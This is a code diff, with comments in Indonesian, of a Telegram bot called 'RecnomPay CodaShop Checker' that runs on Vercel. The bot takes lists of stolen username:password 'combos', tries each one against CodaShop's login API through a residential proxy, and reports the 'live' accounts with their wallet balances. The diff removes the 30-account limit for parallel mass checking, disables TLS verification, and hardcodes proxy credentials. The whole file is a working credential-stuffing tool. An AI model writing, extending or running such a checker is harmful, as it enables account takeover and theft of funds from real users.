@@ -1,14 +1,18 @@
+// Paksa matikan verifikasi SSL secara global agar proxy tidak terblokir
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
 
 const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
+// Inisialisasi Bot dengan Token dari Environment Variable Vercel
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const proxyAgent = new HttpsProxyAgent('http://djHOV4rvR19ogznQ:SMM9r2QbLkUDQLpK@geo.floppydata.com:10080');
+
+// Inisialisasi Proxy
+const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');
 
 // ==========================================
-// FUNGSI INTI PENGECEKAN API (Bisa dipakai berulang)
+// FUNGSI INTI PENGECEKAN API
 // ==========================================
 async function checkAccount(username, password) {
   try {
@@ -32,6 +36,7 @@ async function checkAccount(username, password) {
 
     const resData = authReq.data;
 
+    // Jika Login Berhasil (LIVE)
     if (resData && resData.AuthenticationResult) {
       const idToken = resData.AuthenticationResult.IdToken;
 
@@ -49,6 +54,7 @@ async function checkAccount(username, password) {
       const balance = walletReq.data?.data?.balanceAmount || 0;
       return { status: 'live', balance: balance, msg: 'Success' };
     } else {
+      // Jika Login Gagal (DIE)
       const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
       return { status: 'die', msg: msg };
     }
@@ -58,16 +64,18 @@ async function checkAccount(username, password) {
 }
 
 // ==========================================
-// HANDLER: /START & /CODASHOP (Satuan)
+// HANDLER: /START & MENU BANTUAN
 // ==========================================
 bot.start((ctx) => {
   ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal: Langsung kirim/upload file .txt ke bot ini.');
 });
 
+// ==========================================
+// HANDLER: /CODASHOP (Cek Satuan)
+// ==========================================
 bot.command('codashop', async (ctx) => {
   const args = ctx.message.text.split(' ');
   
-  // Memberikan keterangan jelas jika format salah atau hanya mengetik /codashop
   if (args.length < 2) {
     return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung upload file .txt</b> ke chat ini. Bot akan otomatis memprosesnya!', { parse_mode: 'HTML' });
   }
@@ -97,34 +105,35 @@ bot.command('codashop', async (ctx) => {
 });
 
 // ==========================================
-// HANDLER: UPLOAD FILE .TXT (Mass Check Otomatis)
+// HANDLER: UPLOAD FILE .TXT (Mass Check Unlimited)
 // ==========================================
 bot.on('document', async (ctx) => {
   const doc = ctx.message.document;
   
-  // Validasi file harus .txt
+  // Validasi agar hanya memproses file .txt
   if (!doc.file_name.endsWith('.txt')) {
     return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
   }
 
-  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check... (Max 30 data)</i>', { parse_mode: 'HTML' });
+  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check...</i>\n\n⚠️ <i>Proses massal ini berpacu dengan batas waktu server 10 detik. Jika data terlalu banyak, hasil mungkin tidak muncul.</i>', { parse_mode: 'HTML' });
 
   try {
     const fileLink = await ctx.telegram.getFileLink(doc.file_id);
     const response = await axios.get(fileLink.href);
     const textData = response.data;
 
+    // Ambil SEMUA baris tanpa batas (Unlimited)
     const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
     if (lines.length === 0) {
       return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid di dalam file.');
     }
 
-    const maxLines = lines.slice(0, 30);
     let liveResult = '';
     let liveCount = 0;
     let dieCount = 0;
 
-    const checkPromises = maxLines.map(async (line) => {
+    // Proses semua akun secara paralel agar super cepat
+    const checkPromises = lines.map(async (line) => {
       const combo = line.replace(/[|;\s]/g, ':').split(':');
       if (combo.length >= 2) {
         const username = combo[0].trim();
@@ -135,8 +144,10 @@ bot.on('document', async (ctx) => {
       return null;
     });
 
+    // Menunggu hasil
     const results = await Promise.all(checkPromises);
 
+    // Rekap Data
     results.forEach(item => {
       if (item && item.res.status === 'live') {
         liveCount++;
@@ -146,24 +157,29 @@ bot.on('document', async (ctx) => {
       }
     });
 
+    // Format Pesan Telegram (Mencegah error limit 4096 karakter dari Telegram)
     let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
     if (liveCount > 0) {
-      finalMsg += liveResult;
+      if (liveResult.length > 3000) {
+        finalMsg += liveResult.substring(0, 3000) + `\n... <i>(Hasil dipotong karena limit teks Telegram)</i>\n`;
+      } else {
+        finalMsg += liveResult;
+      }
     } else {
       finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
     }
-    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;
+    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${lines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;
 
     await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });
 
   } catch (error) {
     console.error(error);
-    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses file. Pastikan file tidak terlalu besar.');
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses file.\nKemungkinan: File terlalu besar, Proxy mati, atau terkena Timeout Vercel (10 detik).');
   }
 });
 
 // ==========================================
-// VERCEL SERVERLESS HANDLER
+// HANDLER: VERCEL SERVERLESS FUNCTION
 // ==========================================
 module.exports = async (req, res) => {
   try {
@@ -173,6 +189,7 @@ module.exports = async (req, res) => {
       res.status(200).send('RecnomPay Bot berjalan dengan baik!');
     }
   } catch (error) {
+    console.error(error);
     res.status(500).send('Terjadi kesalahan pada server');
   }
 };
